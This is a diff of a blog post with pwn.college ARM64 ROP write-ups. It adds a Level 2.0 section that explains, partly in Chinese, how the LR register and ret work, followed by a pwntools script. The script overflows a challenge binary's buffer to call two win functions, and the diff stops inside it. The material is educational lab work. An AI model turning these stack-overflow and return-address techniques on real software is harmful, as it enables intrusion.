@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: ARM Architecture (ARM64 ROP) series"
 published: 2026-01-11
-updated: 2026-01-11
+updated: 2026-01-12
 description: "Write-ups for pwn.college binary exploitation series."
 image: ""
 tags: ["Pwn", "Write-ups"]
@@ -143,6 +143,114 @@ def main():
     payload = flat(
         {
             0x7C: elf.sym["win"],
+        },
+        filler=b"\x00",
+    )
+    raw_input("DEBUG")
+    target.send(payload)
+
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Level 2.0
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Now let's see about redirect control flow to multiple functions.
+
+## Write-up
+
+嗯，是当年新手村那味儿没错了～满满的回忆哈哈哈。
+
+简单说一下，调用函数会把返回地址保存在 `LR` 寄存器，函数 `ret` 差不多就是 `x30 = LR, br x30`，所以只要注意观察 epilogue 然后计算就好了。
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    context,
+    flat,
+    gdb,
+    process,
+    raw_input,
+    remote,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", "--local", action="store_true", help="Run locally")
+parser.add_argument("-G", "--gdb", action="store_true", help="Enable GDB")
+parser.add_argument("-P", "--port", type=int, default=1234, help="GDB port for QEMU")
+parser.add_argument("-T", "--threads", type=int, default=None, help="Thread count")
+args = parser.parse_args()
+
+
+FILE = "/challenge/level-2-0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch(argv=None, envp=None):
+    global target, thread
+
+    if argv is None:
+        argv = [FILE]
+
+    if args.local and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.local:
+        if args.gdb and "qemu" in argv[0]:
+            if "-g" not in argv:
+                argv.insert(1, str(args.port))
+                argv.insert(1, "-g")
+        target = process(argv, env=envp)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    # launch(["qemu-aarch64-static", "-L", "/opt/aarch64-rootfs", FILE])
+    target = process(["/challenge/run"])
+
+    payload = flat(
+        {
+            0x8C: elf.sym["win_stage_1"] + 0x8,
+            0x1BC: elf.sym["win_stage_2"] + 0x8,
         },
         filler=b"\x00",
     )
